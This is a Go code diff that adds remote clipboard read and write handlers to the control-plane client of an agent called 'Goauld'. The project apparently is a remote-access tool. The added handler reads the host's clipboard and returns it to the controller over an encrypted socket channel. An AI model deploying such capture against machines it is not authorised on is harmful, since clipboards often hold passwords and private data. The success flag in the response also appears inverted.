@@ -1,6 +1,7 @@
 package control
 
 import (
+	"Goauld/agent/clipboard"
 	"Goauld/common"
 	"Goauld/common/utils"
 	"context"
@@ -285,6 +286,63 @@ func (cpc *ControlPlanClient) init(cfg *sio.ManagerConfig, success chan<- struct
 		}
 		socket.Emit(passwordValidationReq.EventID, response)
 		log.Trace().Bool("Response", res).Msgf("Emit: %s", passwordValidationReq.EventID)
+	})
+
+	socket.OnEvent(socketio.ClipboardContentEvent.ID(), func(data []byte) {
+		log.Trace().Msg("OnEvent: ClipboardContentEvent")
+		message, err := socketio.DecryptClipboardMessageEventMessage(data, config.Get().Cryptor)
+		if err != nil {
+			log.Error().Err(err).Msg("OnEvent: DecryptClipboardMessageEventMessage")
+
+			return
+		}
+		err = bcrypt.CompareHashAndPassword([]byte(message.HashPassword), []byte(config.Get().PrivateSshdPassword()))
+		if err != nil {
+			log.Debug().Err(err).Msg("PasswordValidationRequestEvent: CompareHashAndPassword")
+
+			return
+		}
+
+		err = clipboard.Paste(message.Content)
+		if err != nil {
+			log.Error().Err(err).Msg("OnEvent: Paste")
+		}
+	})
+
+	socket.OnEvent(socketio.CopyClipboardRequestEvent.ID(), func(data []byte) {
+		log.Trace().Msg("OnEvent: CopyClipboardRequestEvent")
+		req, err := socketio.DecryptClipboardRequestMessageEventMessage(data, config.Get().Cryptor)
+		if err != nil {
+			log.Error().Err(err).Msg("OnEvent: DecryptClipboardMessageEventMessage")
+
+			return
+		}
+
+		err = bcrypt.CompareHashAndPassword([]byte(req.HashPassword), []byte(config.Get().PrivateSshdPassword()))
+		if err != nil {
+			log.Debug().Err(err).Msg("PasswordValidationRequestEvent: CompareHashAndPassword")
+
+			return
+		}
+
+		content, err := clipboard.Copy()
+		if err != nil {
+			log.Error().Err(err).Msg("OnEvent: Copy")
+		}
+
+		res := err == nil
+
+		resp := socketio.ClipboardMessage{
+			Error:   res,
+			Content: content,
+		}
+
+		response, err := socketio.NewEncryptedClipboardMessageEventMessage(resp, config.Get().Cryptor)
+		if err != nil {
+			log.Error().Err(err).Msg("OnEvent: EncryptPasswordValidationRequest")
+		}
+		socket.Emit(req.EventID, response)
+		log.Trace().Bool("Response", res).Msgf("Emit: %s", req.EventID)
 	})
 
 	cpc.socket = socket
